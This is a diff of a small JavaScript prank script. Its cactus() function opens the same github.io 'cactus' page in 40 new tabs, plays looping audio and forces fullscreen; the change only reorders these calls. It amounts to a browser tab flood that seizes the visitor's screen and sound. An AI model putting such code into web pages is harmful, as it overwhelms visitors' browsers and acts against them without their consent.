@@ -3,51 +3,51 @@ function full(){
     body.requestFullscreen()
 }
 function cactus(){
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
-    window.open('http://theshitposter78.github.io/cactus/', '_blank');
     var audio = new Audio('out.mp3');
     audio.loop=true
     if (audio.paused){
         audio.play()
     }
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
     full()
 
 }
